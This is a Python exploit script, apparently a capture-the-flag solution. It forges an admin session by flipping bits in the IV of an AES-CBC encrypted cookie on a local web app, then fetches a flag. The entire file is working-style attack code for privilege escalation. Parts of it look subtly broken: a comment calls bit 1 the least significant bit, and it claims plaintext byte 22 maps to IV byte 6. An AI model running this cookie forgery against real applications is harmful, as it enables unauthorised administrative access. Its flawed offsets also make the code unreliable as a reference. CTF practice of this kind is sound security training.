import requests
from base64 import b64encode, b64decode

# Helper function to flip a specific bit in a byte array
def flip_bit(data, byte_index, bit_index):
    byte_array = bytearray(data)
    byte_array[byte_index] ^= (1 << bit_index)
    return bytes(byte_array)

def exploit(url):
    session = requests.Session()

    # Step 1: Register a new user
    register_payload = {"username": "hacker", "password": "password"}
    register_response = session.post(f"{url}/register", data=register_payload)
    if register_response.status_code != 200:
        print("Registration failed.")
        return

    # Step 2: Log in with the new user to obtain the session cookie
    login_payload = {"username": "hacker", "password": "password"}
    login_response = session.post(f"{url}/login", data=login_payload)
    if login_response.status_code != 200:
        print("Login failed.")
        return

    # Step 3: Retrieve the encrypted session cookie
    encrypted_cookie = session.cookies.get('session')
    if not encrypted_cookie:
        print("No session cookie found.")
        return

    print(f"Original Encrypted Cookie: {encrypted_cookie}")

    # Step 4: Decode the base64-encoded cookie to get IV and ciphertext
    decoded_cookie = b64decode(encrypted_cookie)
    if len(decoded_cookie) != 48:
        print(f"Unexpected cookie length: {len(decoded_cookie)} bytes")
        return

    iv = decoded_cookie[:16]
    ct = decoded_cookie[16:]

    # Step 5: Modify the IV to change 'admin=0' to 'admin=1'
    # The '0' is at byte index 22 in plaintext, which corresponds to byte index 6 in the IV
    byte_to_modify = 6  # Zero-based index
    bit_to_flip = 1    # Least significant bit

    modified_iv = flip_bit(iv, byte_to_modify, bit_to_flip)

    # Step 6: Reconstruct the modified cookie
    modified_cookie_bytes = modified_iv + ct
    modified_cookie = b64encode(modified_cookie_bytes).decode()

    print(f"Modified Encrypted Cookie: {modified_cookie}")

    # Step 7: Set the modified cookie and attempt to access the /flag endpoint
    session.cookies.set('session', modified_cookie)
    flag_response = session.get(f"{url}/flag")

    if flag_response.status_code == 200 and "CTF{" in flag_response.text:
        print("Flag retrieved successfully:")
        print(flag_response.text)
    elif flag_response.status_code == 403:
        print("Access denied. Admin privileges required.")
    else:
        print(f"Failed to retrieve flag. Status Code: {flag_response.status_code}")
        print("Response:", flag_response.text)

if __name__ == "__main__":
    # Replace with the actual challenge URL
    url = "http://localhost:5000"
    exploit(url)
